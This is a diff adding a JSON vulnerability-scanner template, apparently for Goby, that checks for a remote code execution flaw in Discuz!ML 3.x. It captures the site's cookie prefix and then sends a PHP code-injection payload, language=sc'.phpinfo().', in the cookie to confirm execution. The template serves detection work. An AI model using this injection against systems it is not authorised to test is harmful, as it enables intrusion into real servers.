@@ -1,0 +1,98 @@
+{
+      "Name": "Discuz!ML 3.x RCE CNVD-2019-22239",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "(app=discuz | body=\"Powered by Discuz! X3.4\")",
+      "Description": "2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用。",
+      "Product": "Discuz!ML",
+      "Homepage": "http://discuz.ml/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnblogs.com/-mo-/p/11180396.html"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/forum.php",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "cookiepre|lastbody|regex|cookiepre = '([\\w_]+)'"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/forum.php",
+                        "follow_redirect": false,
+                        "header": {
+                              "Cookie": "{{{cookiepre}}}language=sc'.phpinfo().'"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "PHP Version",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "System",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-16 17:10:04",
+      "GobyVersion": "1.8.302"
+}
